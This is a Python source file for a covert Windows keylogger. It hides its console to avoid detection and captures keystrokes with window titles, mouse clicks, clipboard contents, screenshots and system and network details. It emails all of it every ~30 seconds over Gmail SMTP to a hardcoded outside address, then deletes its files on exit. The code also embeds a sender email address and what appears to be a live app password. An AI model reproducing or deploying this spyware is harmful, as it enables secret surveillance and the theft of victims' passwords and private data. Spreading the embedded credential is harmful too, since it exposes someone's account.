import os                 # for os related operations
import platform           # for getting the operating system name
import socket             # for socket
import time               # for time operations
import win32clipboard     # for clipboard operations
import smtplib            # for sending email using SMTP protocol (gmail)
import logging            # for logging errors
import time               # for time operations
import psutil             # for getting computer information
import threading          # for threading
import ctypes             # for getting the active window title

from pygetwindow import getActiveWindowTitle    # for getting the active window title
from pynput import keyboard                     # for keylogging
from pynput import mouse                        # for mouse logging
from PIL import ImageGrab                       # for taking screenshots
from email.mime.multipart import MIMEMultipart  # for email operations
from email.mime.text import MIMEText            # for email operations
from email.mime.base import MIMEBase            # for email operations
from email import encoders                      # for email operations
from requests import get                        # for getting public IP Address
from datetime import datetime                   # for date and time operations

network_info_file = "networkinfo.txt"           # file to store network information
mouse_information = "mouseinfo.txt"             # file to store mouse clicks
keys_information = "keylog.txt"                 # file to store keylogs
system_information = "systeminfo.txt"           # file to store system information
clipboard_information = "clipboard.txt"         # file to store clipboard
screenshot_information = "screenshot.png"       # file to store screenshot

time_iteration = 15 # time in seconds for iteration
number_of_iterations_end = 2 # number of iterations for the program to run

keys = []  # list to store keys pressed
count = 0   
currentTime = time.time()   # time at the start of the program
stoppingTime = time.time() + time_iteration    # time at which the program will stop

# Hiding console to avoid detection
def hide_console():                     
    kernel32 = ctypes.WinDLL('kernel32')        
    user32 = ctypes.WinDLL('user32')            
    SW_HIDE = 0                                                                 

    hWnd = kernel32.GetConsoleWindow()      
    if hWnd:
        user32.ShowWindow(hWnd, SW_HIDE)                   

hide_console()

# Mouse information
def on_click(x, y, button, pressed):    
    with open(mouse_information, "a") as f:     
        if pressed:
            f.write('Mouse clicked at {0} with {1}\n'.format((x, y), button))       
        else:
            f.write('Mouse released at {0} with {1}\n'.format((x, y), button))  

# Network information
def network_information():
    with open(network_info_file, "a") as f:
        connections = psutil.net_connections()  # Get all network connections
        for conn in connections:  
            f.write(str(conn) + "\n")
        net_io = psutil.net_io_counters()  # Get network I/O statistics
        f.write("Total Bytes Sent: " + str(net_io.bytes_sent) + "\n")
        f.write("Total Bytes Received: " + str(net_io.bytes_recv) + "\n")
        f.write("Total Packets Sent: " + str(net_io.packets_sent) + "\n")
        f.write("Total Packets Received: " + str(net_io.packets_recv) + "\n")

network_information()

# Computer information
def computer_information():
    with open(system_information, "a") as f:
        hostname = socket.gethostname()
        ip_address = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text  # Get public IP address
            f.write("Public IP Address: " + public_ip + '\n')
        except Exception:
            f.write("Couldn't get Public IP Address (most likely max query)\n")
        f.write("Processor: " + (platform.processor()) + '\n')                       
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address: " + ip_address + "\n")
        f.write("Operating System: " + str(platform.uname()) + "\n")
        f.write("Python Version: " + platform.python_version() + "\n")
        f.write("User Login Name: " + os.getlogin() + "\n")
        f.write("Current Time: " + time.ctime() + "\n")
        f.write("RAM Information: " + str(psutil.virtual_memory()) + "\n")

computer_information()

# Clipboard capturing
def copy_clipboard(filename):
    with open(filename, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            f.write("Clipboard Data: \n" + pasted_data + "\n")
        except TypeError:
            logging.error("No data in clipboard or data type not supported.")
        except Exception as e:
            logging.error(f"Unexpected error: {e}")
        finally:
            win32clipboard.CloseClipboard()

copy_clipboard(clipboard_information)

# Screenshot capturing 
def screenshot():
    im = ImageGrab.grab()
    im.save(screenshot_information)

# Keys pressed with window title and special keys included
def write_file(keys):
    with open(keys_information, "a") as f:  
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write('\n')
            elif k.find("Key") == -1:
                f.write(k)

def get_key_name(key): 
    if isinstance(key, keyboard.KeyCode):
        return key.char
    else:
        return str(key)

def on_press(key):
    global keys, count, currentTime
    key_name = get_key_name(key)
    window_title = getActiveWindowTitle()
    with open(keys_information, "a") as f:
        f.write(f"{window_title}: {key_name}\n")
    keys = []  # Clear the keys list
    currentTime = time.time()
    window_title = getActiveWindowTitle()
    print(f"{window_title}: {key}")

def on_release(key):
    global keys, currentTime, stoppingTime
    if key == keyboard.Key.esc:
        return False
    if currentTime > stoppingTime:
        screenshot()
        # Starting a new thread to send the email to reduce the terminal load and increase code functionality, api keys used to bypass google security  
        email_thread = threading.Thread(target=send_email_with_attachment, args=("polasanihriday@gmail.com", "skyt istp smgm xqbj", "keyloggerinternship@gmail.com",[keys_information, system_information, clipboard_information, screenshot_information, mouse_information, network_info_file]))
        email_thread.start()
        keys = []  # Clear the keys list after sending the email
        stoppingTime = time.time() + 30  # stoppingTime is be 30 seconds // will send an email every ~30 seconds 
        window_title = getActiveWindowTitle()
        print(f"{window_title}: {key}")
        
# Function to send email
def send_email_with_attachment(sender_email, sender_password, recipient_email, files_to_attach):
    # Adding timestamp for easier identification to key log file
    with open(keys_information, "a") as f:
        f.write('\n' + 'Timestamp: ' + datetime.now().strftime('%Y-%m-%d %H:%M:%S') + '\n')
        
    message = MIMEMultipart()   # Create a multipart message
    message['From'] = sender_email
    message['To'] = recipient_email
    message['Subject'] = "Keylogger Report " + datetime.now().strftime('%Y-%m-%d %H:%M:%S')  # Add timestamp to subject
    message.attach(MIMEText("Please find attached keylogger report.", 'plain'))

    for file_path in files_to_attach:
        try:
            with open(file_path, "rb") as attachment:
                part = MIMEBase('application', 'octet-stream')  
                part.set_payload(attachment.read()) 
                encoders.encode_base64(part)    # Encode file in ASCII characters to send by email
                part.add_header('Content-Disposition', f"attachment; filename={file_path}")
                message.attach(part)
        except FileNotFoundError:
            print(f"Error: File not found at {file_path}")
        except Exception as e:
            print(f"Error: {e}")

    try:
        with smtplib.SMTP('smtp.gmail.com', 587) as server:     # Log in to server using secure context and send email
            server.starttls()
            server.login(sender_email, sender_password)  
            server.sendmail(sender_email, recipient_email, message.as_string())
        print("Email sent successfully!")
    except Exception as e:
        print(f"Error sending email: {e}")

# Function to self-destruct 
def self_destruct():
    files_to_remove = [keys_information, system_information, clipboard_information, screenshot_information, mouse_information, network_info_file]   # List of files to remove
    for file_path in files_to_remove:
        try:
            os.remove(file_path)
            print(f"File {file_path} has been removed successfully")
        except Exception as e:
            print(f"Error deleting {file_path}: {e}")
    os._exit(0)

number_of_iterations_end = 1000     

try:
# Main loop
    iteration_count = 0         
    while True:
        with keyboard.Listener(on_press=on_press, on_release=on_release) as keyboard_listener, \
            mouse.Listener(on_click=on_click) as mouse_listener:
            keyboard_listener.join()
            mouse_listener.join()

    # Reset stoppingTime for the next iteration
            stoppingTime = time.time() + time_iteration
            iteration_count += 1
            if iteration_count >= number_of_iterations_end:
                break
            
finally:       
    self_destruct()     # Self-destruct after the loop finishes